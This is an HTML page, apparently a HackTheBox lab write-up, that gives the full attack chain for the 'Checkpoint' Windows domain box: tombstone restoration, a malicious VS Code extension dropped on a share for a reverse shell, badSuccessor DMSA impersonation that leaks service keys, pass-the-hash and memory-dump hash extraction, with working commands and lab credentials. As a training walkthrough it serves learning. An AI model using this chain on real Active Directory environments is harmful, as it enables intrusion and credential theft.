@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Checkpoint — HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Checkpoint (Medium, Windows) full write up: AD enumeration → deleted object restoration → malicious VSIX extension → Kerberos DMSA impersonation → memory forensics → root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}
+.tag-windows{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#60a5fa}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / medium / windows</p>
+      <h1>Checkpoint</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-medium">Medium</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-windows">Windows</span></div></div>
+      </div>
+
+      <h2>Synopsis</h2>
+      <p>Checkpoint is a medium-difficulty Windows domain box built around Active Directory attack paths. The chain starts with <strong>DACL enumeration</strong>: the initial account can restore a <strong>deleted AD object</strong> (a "tombsone") whose credentials are reused. That account can write to a <strong>VS Code extensions drop share</strong>, so a <strong>malicious .vsix extension</strong> is auto-installed by a victim and fires code as <code>ryan.brooks</code>. From there a <strong>Kerberos DMSA impersonation</strong> (<code>badSuccessor</code>) yields the password hash of the <code>svc_deploy</code> service account, which has read access to a <strong>VM backup share</strong>. A full memory dump is pulled and mined with <strong>Volatility</strong> for the local Administrator hash.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Active Directory enumeration</li>
+        <li>BloodHound / bloodyAD usage</li>
+        <li>SMB share enumeration</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Restoring deleted AD objects (tombstones) to recover access</li>
+        <li>Malicious VS Code extension (.vsix) execution</li>
+        <li>DMSA (service account) impersonation via <code>badSuccessor</code></li>
+        <li>Memory forensics with Volatility to extract hashes</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>A full port scan reveals a domain controller.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 13:02 -0400
+Nmap scan report for checkpoint.htb (10.129.28.9)
+Host is up (0.051s latency).
+Not shown: 988 filtered tcp ports (no-response)
+
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              (Domain: checkpoint.htb)
+3269/tcp open  globalcatLDAPssl?
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (WinRM)
+
+Service Info: Host: DC01; OS: Windows</pre>
+
+      <h2>Initial Access</h2>
+      <h3>AD enumeration with bloodyAD</h3>
+      <p>With a set of valid credentials (<code>alex.turner</code>), writable objects are enumerated.</p>
+      <pre>bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.28.9 get writable</pre>
+      <p>Several interesting ACLs stand out, especially a <strong>deleted object</strong>:</p>
+      <pre>distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Employees,DC=checkpoint,DC=htb
+permission: CREATE_CHILD</pre>
+
+      <h3>Restoring a deleted object</h3>
+      <p>Mark Davies was deleted from the directory — but our account has write access to the tombstone. bloodAD can restore it.</p>
+      <pre>bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.28.9 \
+  set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
+
+[+] CN=Mark Davies has been restored successfully under
+    CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb</pre>
+      <p><code>mark.davies</code> reuses the same password as the initial user. The restored account turns out to be able to <strong>write to the DevDrop SMB share</strong> — a drop folder for approved VS Code extensions.</p>
+      <pre>nxc smb 10.129.28.9 -u mark.davies -p 'Checkpoint2024!' -d checkpoint.htb --shares
+
+SMB  ...  Share     Permissions  Remark
+SMB  ...  DevDrop   READ,WRITE   VS Code extensions share for approved
+                                 .vsix packages compatible with VS Code
+                                 engine 1.118.0
+SMB  ...  VMBackups</pre>
+
+      <h3>Malicious VS Code extension</h3>
+      <p>A crafted <code>.vsix</code> extension is built with a malicious <code>extension.js</code> (a reverse shell) and dropped onto the share. When a victim's VS Code picks up the approved extension, it executes our code as that user.</p>
+      <pre>nxc smb 10.129.28.9 -u mark.davies -p 'Checkpoint2024!' -d checkpoint.htb \
+  --share DevDrop --put-file checkpoint-dark-theme.vsix checkpoint-dark-theme.vsix</pre>
+      <p>After about a minute we receive a shell as <strong>ryan.brooks</strong> and read the user flag.</p>
+
+      <h2>Privilege Escalation</h2>
+      <h3>Kerberos TGT via Rubeus</h3>
+      <p>From the victim host, Rubeus is used to obtain a TGT for <code>ryan.brooks</code>, then converted to ccache format.</p>
+      <pre>./Rubeus.exe tgtdeleg /nowrap
+
+echo '&lt;base64&gt;' | base64 -d &gt; ryan.kirbi
+impacket-ticketConverter ryan.kirbi ryan.ccache</pre>
+
+      <h3>DMSA impersonation with badSuccessor</h3>
+      <p>Using the ticket, <code>badSuccessor</code> creates a new machine account and impersonates the <code>svc_deploy</code> DMSA, recovering its password hashes from the returned TGS.</p>
+      <pre>KRB5CCNAME=ryan.ccache bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k \
+  add badSuccessor evil-dmsa4 -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
+  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'</pre>
+      <pre>[+] Creating DMSA evil-dmsa4$ in OU=DMSAHolder
+[+] Impersonating: CN=SVC_DEPLOY,...
+[+] dMSA TGT stored in ccache file evil-dmsa4_Ne.ccache
+
+dMSA current keys found in TGS:
+AES256: e277825601b2568e27ab128c5bad730fd9215733cfe71be232f9e65b37205f5e
+AES128: 153d93a9359d21b57f9143265911bedf
+RC4:    80dcbc82c46d83c493575fb2c471944a
+
+dMSA previous keys found in TGS:
+RC4:    e16081eb077aca74bdbf8af12af43ac9</pre>
+
+      <h3>Accessing the VMBackups share</h3>
+      <p>Authenticating as <code>svc_deploy</code> (with the recovered NT hash) grants access to the backup share, which contains a full VM memory snapshot.</p>
+      <pre>smbclient //10.129.29.30/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
+
+smb: \NightlyBackup_2024-11-01\memory forensics\&gt; get "Windows Server 2019-Snapshot1.vmem"</pre>
+
+      <h3>Memory forensics → Administrator</h3>
+      <p>The memory dump is analyzed with Volatility to recover the local account hashes.</p>
+      <pre>vol -f ~/htb/Checkpoint/Windows\ Server\ 2019-Snapshot1.vmem windows.hashdump.Hashdump | grep -i Administrator</pre>
+      <p>The Administrator NT hash grants a WinRM shell on the box.</p>
+      <pre>evil-winrm -i 10.129.29.30 -u Administrator -H f29e9c014295b9b32139b09a2790be3b</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Deleted AD objects can be a backdoor</strong> — write access to a tombstone lets an attacker restore a principal whose password was never reset.</li>
+        <li><strong>Approved app-drop folders are a supply-chain vector</strong> — a "vetted" VSIX/plugin is executed by the victim with their privileges.</li>
+        <li><strong>DMSAs are recoverable through impersonation</strong> — machine accounts holding DMSA privileges leak the service account's current and previous keys in a TGS.</li>
+        <li><strong>Backup shares full of memory snapshots</strong> are effectively credential stores; one Volatility run can dump the whole local account database.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
